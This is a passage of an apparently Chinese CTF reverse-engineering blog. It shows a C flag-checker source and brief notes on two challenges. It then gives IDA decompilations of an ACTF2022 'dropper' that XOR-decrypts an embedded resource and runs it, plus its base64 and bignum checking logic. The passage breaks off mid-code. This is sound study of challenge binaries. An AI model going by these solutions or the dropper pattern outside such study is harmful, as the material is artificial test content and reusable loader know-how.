class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> Q 7937</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ZETA 2805</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> N 256</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> POINTS[N] = &#123;<span class="number">4074</span>, <span class="number">1455</span>, <span class="number">891</span>, <span class="number">5096</span>, <span class="number">28</span>, <span class="number">6122</span>, <span class="number">2068</span>, <span class="number">704</span>, <span class="number">4580</span>, <span class="number">6480</span>, <span class="number">4182</span>, <span class="number">5243</span>, <span class="number">2685</span>, <span class="number">1102</span>, <span class="number">2504</span>, <span class="number">3812</span>, <span class="number">211</span>, <span class="number">1006</span>, <span class="number">7596</span>, <span class="number">1530</span>, <span class="number">799</span>, <span class="number">5539</span>, <span class="number">727</span>, <span class="number">3313</span>, <span class="number">1335</span>, <span class="number">1226</span>, <span class="number">6120</span>, <span class="number">2296</span>, <span class="number">2504</span>, <span class="number">447</span>, <span class="number">1902</span>, <span class="number">3393</span>, <span class="number">6614</span>, <span class="number">3827</span>, <span class="number">1532</span>, <span class="number">116</span>, <span class="number">5742</span>, <span class="number">7236</span>, <span class="number">80</span>, <span class="number">2688</span>, <span class="number">7754</span>, <span class="number">1563</span>, <span class="number">1918</span>, <span class="number">3739</span>, <span class="number">6177</span>, <span class="number">6805</span>, <span class="number">4307</span>, <span class="number">2005</span>, <span class="number">5423</span>, <span class="number">611</span>, <span class="number">2984</span>, <span class="number">7520</span>, <span class="number">1011</span>, <span class="number">6977</span>, <span class="number">4891</span>, <span class="number">3979</span>, <span class="number">5721</span>, <span class="number">539</span>, <span class="number">4055</span>, <span class="number">4990</span>, <span class="number">2175</span>, <span class="number">564</span>, <span class="number">4938</span>, <span class="number">4655</span>, <span class="number">6569</span>, <span class="number">7444</span>, <span class="number">6491</span>, <span class="number">2228</span>, <span class="number">4736</span>, <span class="number">1548</span>, <span class="number">5946</span>, <span class="number">6654</span>, <span class="number">4460</span>, <span class="number">4072</span>, <span class="number">6491</span>, <span class="number">7305</span>, <span class="number">2156</span>, <span class="number">2147</span>, <span class="number">3373</span>, <span class="number">4322</span>, <span class="number">6628</span>, <span class="number">4691</span>, <span class="number">6763</span>, <span class="number">6320</span>, <span class="number">37</span>, <span class="number">4509</span>, <span class="number">7870</span>, <span class="number">4644</span>, <span class="number">4028</span>, <span class="number">7076</span>, <span class="number">2827</span>, <span class="number">1921</span>, <span class="number">2992</span>, <span class="number">7316</span>, <span class="number">4806</span>, <span class="number">1375</span>, <span class="number">7264</span>, <span class="number">1471</span>, <span class="number">7446</span>, <span class="number">3743</span>, <span class="number">4069</span>, <span class="number">7613</span>, <span class="number">1284</span>, <span class="number">7933</span>, <span class="number">3439</span>, <span class="number">6909</span>, <span class="number">4150</span>, <span class="number">1543</span>, <span class="number">2862</span>, <span class="number">3452</span>, <span class="number">5114</span>, <span class="number">131</span>, <span class="number">246</span>, <span class="number">1700</span>, <span class="number">5230</span>, <span class="number">6932</span>, <span class="number">7176</span>, <span class="number">6984</span>, <span class="number">6837</span>, <span class="number">183</span>, <span class="number">2960</span>, <span class="number">2006</span>, <span class="number">6865</span>, <span class="number">1741</span>, <span class="number">3669</span>, <span class="number">7709</span>, <span class="number">7777</span>, <span class="number">5212</span>, <span class="number">6425</span>, <span class="number">3948</span>, <span class="number">5257</span>, <span class="number">7185</span>, <span class="number">4391</span>, <span class="number">4539</span>, <span class="number">2458</span>, <span class="number">1407</span>, <span class="number">2293</span>, <span class="number">1669</span>, <span class="number">3473</span>, <span class="number">5785</span>, <span class="number">6692</span>, <span class="number">7882</span>, <span class="number">4209</span>, <span class="number">4828</span>, <span class="number">3434</span>, <span class="number">4506</span>, <span class="number">5839</span>, <span class="number">6578</span>, <span class="number">6587</span>, <span class="number">7797</span>, <span class="number">2449</span>, <span class="number">6569</span>, <span class="number">3129</span>, <span class="number">1508</span>, <span class="number">4449</span>, <span class="number">6797</span>, <span class="number">1769</span>, <span class="number">4347</span>, <span class="number">7250</span>, <span class="number">751</span>, <span class="number">3892</span>, <span class="number">4899</span>, <span class="number">2216</span>, <span class="number">1746</span>, <span class="number">926</span>, <span class="number">1803</span>, <span class="number">3985</span>, <span class="number">705</span>, <span class="number">7416</span>, <span class="number">7029</span>, <span class="number">3965</span>, <span class="number">732</span>, <span class="number">4212</span>, <span class="number">175</span>, <span class="number">5538</span>, <span class="number">5673</span>, <span class="number">7441</span>, <span class="number">1352</span>, <span class="number">233</span>, <span class="number">1949</span>, <span class="number">7343</span>, <span class="number">2137</span>, <span class="number">3740</span>, <span class="number">1802</span>, <span class="number">3616</span>, <span class="number">6728</span>, <span class="number">5792</span>, <span class="number">433</span>, <span class="number">606</span>, <span class="number">6487</span>, <span class="number">4409</span>, <span class="number">4080</span>, <span class="number">1699</span>, <span class="number">967</span>, <span class="number">2789</span>, <span class="number">6314</span>, <span class="number">3146</span>, <span class="number">7452</span>, <span class="number">510</span>, <span class="number">4973</span>, <span class="number">1970</span>, <span class="number">5900</span>, <span class="number">5413</span>, <span class="number">1254</span>, <span class="number">146</span>, <span class="number">7665</span>, <span class="number">5124</span>, <span class="number">3622</span>, <span class="number">6258</span>, <span class="number">4063</span>, <span class="number">3456</span>, <span class="number">5228</span>, <span class="number">1387</span>, <span class="number">7359</span>, <span class="number">5885</span>, <span class="number">997</span>, <span class="number">3072</span>, <span class="number">884</span>, <span class="number">2780</span>, <span class="number">0</span>, <span class="number">222</span>, <span class="number">4840</span>, <span class="number">1193</span>, <span class="number">4913</span>, <span class="number">984</span>, <span class="number">2608</span>, <span class="number">2291</span>, <span class="number">1551</span>, <span class="number">6595</span>, <span class="number">7810</span>, <span class="number">5811</span>, <span class="number">7147</span>, <span class="number">682</span>, <span class="number">5000</span>, <span class="number">4413</span>, <span class="number">7743</span>, <span class="number">6106</span>, <span class="number">4231</span>, <span class="number">4336</span>, <span class="number">6047</span>, <span class="number">3478</span>, <span class="number">1935</span>, <span class="number">6396</span>, <span class="number">2303</span>, <span class="number">4407</span>, <span class="number">6919</span>, <span class="number">4488</span>, <span class="number">5276</span>, <span class="number">2171</span>, <span class="number">5376</span>, <span class="number">7662</span>, <span class="number">700</span>, <span class="number">3059</span>, <span class="number">1277</span>, <span class="number">4674</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">br</span><span class="params">(<span class="type">int</span> x)</span> &#123;</span><br><span class="line">    <span class="type">int</span> y = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">7</span>; i++) &#123;</span><br><span class="line">        y &lt;&lt;= <span class="number">1</span>;</span><br><span class="line">        y |= (x &gt;&gt; i) &amp; <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> y;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">powmod</span><span class="params">(<span class="type">int</span> base, <span class="type">int</span> <span class="built_in">exp</span>, <span class="type">int</span> mod)</span> &#123;</span><br><span class="line">    base %= mod;</span><br><span class="line">    <span class="type">int</span> res = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span>(<span class="built_in">exp</span> &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">exp</span> &amp; <span class="number">1</span>) &#123;</span><br><span class="line">            res = (res * base) % mod;</span><br><span class="line">        &#125;</span><br><span class="line">        base = (base * base) % mod;</span><br><span class="line">        <span class="built_in">exp</span> &gt;&gt;= <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">transform</span><span class="params">(<span class="type">int</span> r[N])</span> &#123;</span><br><span class="line">    <span class="type">int</span> j;</span><br><span class="line">    <span class="type">int</span> k = <span class="number">1</span>;</span><br><span class="line">    <span class="type">int</span> l = <span class="number">128</span>;</span><br><span class="line">    <span class="keyword">while</span>(l &gt;= <span class="number">2</span>) &#123;</span><br><span class="line">        <span class="type">int</span> start = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(start &lt; <span class="number">256</span>) &#123;</span><br><span class="line">            <span class="type">int</span> zeta = powmod(ZETA, br(k++), Q);</span><br><span class="line">            <span class="keyword">for</span>(j = start; j &lt; start + l; j++) &#123;</span><br><span class="line">                <span class="type">int</span> t = (zeta * r[j + l]) % Q;</span><br><span class="line">                r[j + l] = (r[j] - t) % Q;</span><br><span class="line">                r[j] = (r[j] + t) % Q;</span><br><span class="line">            &#125;</span><br><span class="line">            start = j + l;</span><br><span class="line">        &#125;</span><br><span class="line">        l &gt;&gt;= <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">poly_eval</span><span class="params">(<span class="type">int</span> r[N], <span class="type">int</span> x)</span> &#123;</span><br><span class="line">    <span class="type">int</span> s = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; N; i++) &#123;</span><br><span class="line">        s *= x;</span><br><span class="line">        s += r[N - i - <span class="number">1</span>];</span><br><span class="line">        s %= Q;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> s;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;What is the flag? &quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> inp[N];</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%256s&quot;</span>, inp);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> poly[N] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> len = <span class="built_in">strlen</span>(inp);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">        poly[i] = inp[i] * <span class="number">61</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    transform(poly);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> good = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt; N; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span>((poly_eval(poly, i) - POINTS[i<span class="number">-1</span>]) % Q != <span class="number">0</span>) &#123;</span><br><span class="line">            good = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(good) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Correct!&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Incorrect!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="wrong-signal"><a href="#wrong-signal" class="headerlink" title="wrong-signal"></a>wrong-signal</h2><p>没搞懂逻辑啊 虽说猜到是个maze 但是这个sigaction属实没搞懂<br>等找到WP(带点解析的…)再来看吧</p><h2 id="SPACEGAME"><a href="#SPACEGAME" class="headerlink" title="SPACEGAME"></a>SPACEGAME</h2><p>lua逆向…<br>思路倒是学到了 全局hook的思想 打印关键信息(哪个函数kill了进程)<br>然后给他override掉 开启无敌模式<br>但是对lua不熟悉 以后再来看吧</p><h1 id="ACTF2022"><a href="#ACTF2022" class="headerlink" title="ACTF2022"></a>ACTF2022</h1><h2 id="dropper"><a href="#dropper" class="headerlink" title="dropper"></a>dropper</h2><p>逆了好久好久…</p><p>IDA打开 main<br>将函数符号化后逻辑比较清晰</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main_0</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *v3; <span class="comment">// rdi</span></span><br><span class="line">  __int64 i; <span class="comment">// rcx</span></span><br><span class="line">  <span class="type">char</span> v6; <span class="comment">// [rsp+30h] [rbp+0h] BYREF</span></span><br><span class="line">  HMODULE ModuleHandleW; <span class="comment">// [rsp+38h] [rbp+8h]</span></span><br><span class="line">  __int64 v8; <span class="comment">// [rsp+58h] [rbp+28h]</span></span><br><span class="line">  __int64 v9; <span class="comment">// [rsp+78h] [rbp+48h]</span></span><br><span class="line">  __int64 v10[<span class="number">3</span>]; <span class="comment">// [rsp+98h] [rbp+68h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v11; <span class="comment">// [rsp+B4h] [rbp+84h]</span></span><br><span class="line">  <span class="type">int</span> ExitCode[<span class="number">9</span>]; <span class="comment">// [rsp+D4h] [rbp+A4h] BYREF</span></span><br><span class="line">  HANDLE hHandle[<span class="number">3</span>]; <span class="comment">// [rsp+F8h] [rbp+C8h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v14[<span class="number">26</span>]; <span class="comment">// [rsp+130h] [rbp+100h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v15; <span class="comment">// [rsp+1B4h] [rbp+184h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v3 = &amp;v6;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">106</span>i64; i; --i )</span><br><span class="line">  &#123;</span><br><span class="line">    *(_DWORD *)v3 = <span class="number">-858993460</span>;</span><br><span class="line">    v3 += <span class="number">4</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  j___CheckForDebuggerJustMyCode(&amp;unk_7FF6D0925100, argv, envp);</span><br><span class="line">  sub_7FF6D09013D4();</span><br><span class="line">  ModuleHandleW = GetModuleHandleW(<span class="number">0</span>i64);</span><br><span class="line">  v8 = FindResourceWqword_7FF6D091AA58(ModuleHandleW, <span class="number">101</span>i64, <span class="number">256</span>i64);<span class="comment">// 加载了自带resource 256</span></span><br><span class="line">  v9 = LoadResourceqword_7FF6D091AA60(ModuleHandleW, v8);</span><br><span class="line">  v10[<span class="number">0</span>] = LockResourceqword_7FF6D091AA68(v9);</span><br><span class="line">  v11 = SizeOfResourceqword_7FF6D091AA70(ModuleHandleW, v8);</span><br><span class="line">  v10[<span class="number">0</span>] = sub_7FF6D09013D9(v10[<span class="number">0</span>], v11);       <span class="comment">// ^=0x73 解密</span></span><br><span class="line">  ExitCode[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">  j_memset(hHandle, <span class="number">0</span>, <span class="keyword">sizeof</span>(hHandle));</span><br><span class="line">  j_memset(v14, <span class="number">0</span>, <span class="keyword">sizeof</span>(v14));</span><br><span class="line">  LOWORD(v15) = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !(<span class="type">unsigned</span> <span class="type">int</span>)sub_7FF6D09015C3((<span class="type">int</span>)hHandle, (<span class="type">int</span>)v14, v10[<span class="number">0</span>], (<span class="type">int</span>)&amp;v15, <span class="number">2u</span>i64) )</span><br><span class="line">  &#123;</span><br><span class="line">    WaitForSingleObject(hHandle[<span class="number">0</span>], <span class="number">0xFFFFFFFF</span>);</span><br><span class="line">    GetExitCodeProcess(hHandle[<span class="number">0</span>], (LPDWORD)ExitCode);</span><br><span class="line">    CloseHandle(hHandle[<span class="number">1</span>]);</span><br><span class="line">    CloseHandle(hHandle[<span class="number">0</span>]);</span><br><span class="line">  &#125;</span><br><span class="line">  sub_7FF6D09014B0();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里加载了程序内的资源 256  然后xor 0x73进行解密<br>找到256资源xor后dump出来</p><p>main 函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main_0</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *v3; <span class="comment">// rdi</span></span><br><span class="line">  __int64 i; <span class="comment">// rcx</span></span><br><span class="line">  __int64 v5; <span class="comment">// rdx</span></span><br><span class="line">  __int64 v6; <span class="comment">// r8</span></span><br><span class="line">  __int64 v7; <span class="comment">// rax</span></span><br><span class="line">  __int64 BASE64_INPUT; <span class="comment">// rax</span></span><br><span class="line">  __int64 v9; <span class="comment">// rdx</span></span><br><span class="line">  __int64 v10; <span class="comment">// r8</span></span><br><span class="line">  __int64 v11; <span class="comment">// rax</span></span><br><span class="line">  __int64 v12; <span class="comment">// rax</span></span><br><span class="line">  __int64 v13; <span class="comment">// rax</span></span><br><span class="line">  __int64 v14; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">char</span> v16; <span class="comment">// [rsp+20h] [rbp+0h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v17[<span class="number">72</span>]; <span class="comment">// [rsp+28h] [rbp+8h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v18[<span class="number">2040</span>]; <span class="comment">// [rsp+70h] [rbp+50h] BYREF</span></span><br><span class="line">  <span class="type">void</span> (__fastcall ***v19)(_QWORD, __int64); <span class="comment">// [rsp+868h] [rbp+848h]</span></span><br><span class="line">  __int64 v20; <span class="comment">// [rsp+888h] [rbp+868h]</span></span><br><span class="line">  <span class="type">char</span> v21[<span class="number">3576</span>]; <span class="comment">// [rsp+8B0h] [rbp+890h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v22[<span class="number">64</span>]; <span class="comment">// [rsp+16A8h] [rbp+1688h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v23[<span class="number">64</span>]; <span class="comment">// [rsp+16E8h] [rbp+16C8h] BYREF</span></span><br><span class="line">  <span class="type">char</span> *v24; <span class="comment">// [rsp+1728h] [rbp+1708h]</span></span><br><span class="line">  <span class="type">void</span> (__fastcall ***v25)(_QWORD, _QWORD); <span class="comment">// [rsp+1748h] [rbp+1728h]</span></span><br><span class="line">  <span class="type">void</span> *v26; <span class="comment">// [rsp+1768h] [rbp+1748h]</span></span><br><span class="line">  <span class="type">char</span> v27; <span class="comment">// [rsp+1788h] [rbp+1768h] BYREF</span></span><br><span class="line">  <span class="type">char</span> *v28; <span class="comment">// [rsp+1F78h] [rbp+1F58h]</span></span><br><span class="line">  <span class="type">char</span> v29[<span class="number">64</span>]; <span class="comment">// [rsp+1F98h] [rbp+1F78h] BYREF</span></span><br><span class="line">  __int64 v30; <span class="comment">// [rsp+1FD8h] [rbp+1FB8h]</span></span><br><span class="line">  <span class="type">void</span> *v31; <span class="comment">// [rsp+1FF8h] [rbp+1FD8h]</span></span><br><span class="line">  <span class="type">char</span> v32[<span class="number">64</span>]; <span class="comment">// [rsp+2018h] [rbp+1FF8h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v33[<span class="number">64</span>]; <span class="comment">// [rsp+2058h] [rbp+2038h] BYREF</span></span><br><span class="line">  <span class="type">void</span> (__fastcall ***v34)(_QWORD, _QWORD); <span class="comment">// [rsp+2098h] [rbp+2078h]</span></span><br><span class="line">  <span class="type">int</span> v35; <span class="comment">// [rsp+20B4h] [rbp+2094h]</span></span><br><span class="line">  <span class="type">int</span> v36; <span class="comment">// [rsp+20D4h] [rbp+20B4h]</span></span><br><span class="line">  __int64 tmp_string; <span class="comment">// [rsp+20E8h] [rbp+20C8h]</span></span><br><span class="line">  __int64 v38; <span class="comment">// [rsp+20F0h] [rbp+20D0h]</span></span><br><span class="line">  <span class="type">void</span> (__fastcall ***v39)(_QWORD, _QWORD); <span class="comment">// [rsp+20F8h] [rbp+20D8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = &amp;v16;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">1726</span>i64; i; --i )</span><br><span class="line">  &#123;</span><br><span class="line">    *(_DWORD *)v3 = <span class="number">0xCCCCCCCC</span>;</span><br><span class="line">    v3 += <span class="number">4</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  v36 = <span class="number">0</span>;</span><br><span class="line">  j___CheckForDebuggerJustMyCode(&amp;unk_7FF7ECAF60F2, argv, envp);</span><br><span class="line">  tmp_string = sub_7FF7ECAD128A((__int64)v22, (__int64)&amp;unk_7FF7ECAEE168, <span class="number">5</span>i64);</span><br><span class="line">  v38 = tmp_string;</span><br><span class="line">  sub_7FF7ECAD1735(<span class="built_in">std</span>::<span class="built_in">cout</span>, tmp_string);</span><br><span class="line">  sub_7FF7ECAD119A((__int64)v22);</span><br><span class="line">  sub_7FF7ECAD17DF((__int64)v17);</span><br><span class="line">  sub_7FF7ECAD1032(<span class="built_in">std</span>::<span class="built_in">cin</span>, v17);</span><br><span class="line">  tmp_string = STRLEN_0((__int64)v17);</span><br><span class="line">  v7 = GET_C_STR((__int64)v17, v5, v6);</span><br><span class="line">  BASE64_INPUT = sub_7FF7ECAD1320(v7, (<span class="type">unsigned</span> <span class="type">int</span>)tmp_string);<span class="comment">// base64</span></span><br><span class="line">  sub_7FF7ECAD1050((__int64)v17, BASE64_INPUT); <span class="comment">// v13=v6 ?</span></span><br><span class="line">  v24 = v23;</span><br><span class="line">  tmp_string = sub_7FF7ECAD1136((__int64)v23, (__int64)v17);</span><br><span class="line">  sub_7FF7ECAD1244(v18, tmp_string);</span><br><span class="line">  v26 = operator new(<span class="number">2016u</span>i64);</span><br><span class="line">  <span class="keyword">if</span> ( v26 )</span><br><span class="line">  &#123;</span><br><span class="line">    v28 = &amp;v27;</span><br><span class="line">    tmp_string = sub_7FF7ECAD128A((__int64)v29, (__int64)&amp;unk_7FF7ECAEF300, <span class="number">360</span>i64);</span><br><span class="line">    v38 = tmp_string;</span><br><span class="line">    v36 |= <span class="number">1u</span>;</span><br><span class="line">    v11 = GET_C_STR(tmp_string, v9, v10);</span><br><span class="line">    v12 = STRING_TO_BIGNUM((__int64)v28, v11);</span><br><span class="line">    v39 = (<span class="type">void</span> (__fastcall ***)(_QWORD, _QWORD))sub_7FF7ECAD1433((__int64)v26, v12);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v39 = <span class="number">0</span>i64;</span><br><span class="line">  &#125;</span><br><span class="line">  v25 = v39;</span><br><span class="line">  v19 = v39;</span><br><span class="line">  <span class="keyword">if</span> ( (v36 &amp; <span class="number">1</span>) != <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v36 &amp;= ~<span class="number">1u</span>;</span><br><span class="line">    sub_7FF7ECAD119A((__int64)v29);</span><br><span class="line">  &#125;</span><br><span class="line">  j_TO_CALCULATION((__int64)v19);               <span class="comment">// calcultaion</span></span><br><span class="line">  v31 = operator new(<span class="number">0x7D4</span>ui64);</span><br><span class="line">  <span class="keyword">if</span> ( v31 )</span><br><span class="line">    tmp_string = STR_COPY_0((__int64)v31, (__int64)v18);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    tmp_string = <span class="number">0</span>i64;</span><br><span class="line">  v30 = tmp_string;</span><br><span class="line">  v20 = tmp_string;</span><br><span class="line">  (**v19)(v19, tmp_string);</span><br><span class="line">  SUB(v20, (__int64)v21, (__int64)(v19 + <span class="number">1</span>));   <span class="comment">// !</span></span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> __int8)sub_7FF7ECAD1014((__int64)v21) )</span><br><span class="line">  &#123;</span><br><span class="line">    tmp_string = sub_7FF7ECAD128A((__int64)v32, (__int64)&amp;unk_7FF7ECAEF910, <span class="number">4</span>i64);</span><br><span class="line">    v38 = tmp_string;</span><br><span class="line">    v13 = sub_7FF7ECAD1735(<span class="built_in">std</span>::<span class="built_in">cout</span>, tmp_string);</span><br><span class="line">    <span class="built_in">std</span>::ostream::operator&lt;&lt;(v13, sub_7FF7ECAD105A);</span><br><span class="line">    sub_7FF7ECAD119A((__int64)v32);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    tmp_string = sub_7FF7ECAD128A((__int64)v33, (__int64)&amp;unk_7FF7ECAEF920, <span class="number">5</span>i64);</span><br><span class="line">    v38 = tmp_string;</span><br><span class="line">    v14 = sub_7FF7ECAD1735(<span class="built_in">std</span>::<span class="built_in">cout</span>, tmp_string);</span><br><span class="line">    <span class="built_in">std</span>::ostream::operator&lt;&lt;(v14, 